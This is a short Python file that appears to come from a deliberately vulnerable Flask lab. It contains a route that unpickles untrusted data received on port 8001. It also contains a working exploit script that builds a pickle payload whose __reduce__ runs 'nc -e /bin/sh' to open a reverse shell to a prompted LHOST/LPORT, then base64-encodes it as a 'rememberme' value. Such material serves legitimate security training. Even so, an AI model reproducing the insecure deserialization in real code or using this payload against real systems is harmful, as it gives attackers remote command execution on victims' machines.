from flask import Flask,jsonify,render_template_string,request,Response,render_template
import subprocess
from werkzeug.datastructures import Headers
from werkzeug.utils import secure_filename
import sqlite3


app = Flask(__name__)
app.config['UPLOAD_FOLDER']="/home/kali/Desktop/upload"
app.config['MAX_CONTENT_LENGTH'] = 16 * 1000 * 1000

@app.route("/deserialization/")
def deserialization():
    try:
        import socket, pickle
        HOST = "0.0.0.0"
        PORT = 8001
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, PORT))
            s.listen()
            connection, address = s.accept()
            with connection:
                received_data = connection.recv(1024)
                data=pickle.loads(received_data)
                return str(data)
    except:
        return jsonify(data="You must connect 8001 port"), 200
    
##
    
import base64, os
lhost = input("LHOST: ")
lport = input("LPORT: ")
class payload(object):
    def __reduce__(self):
        return (os.system,(f"nc -nv {lhost} {lport} -e /bin/sh",))
deserialpayload = payload()
serialpayload = pickle.dumps(deserialpayload)
rememberme = base64.b64encode(serialpayload)
print(rememberme) 
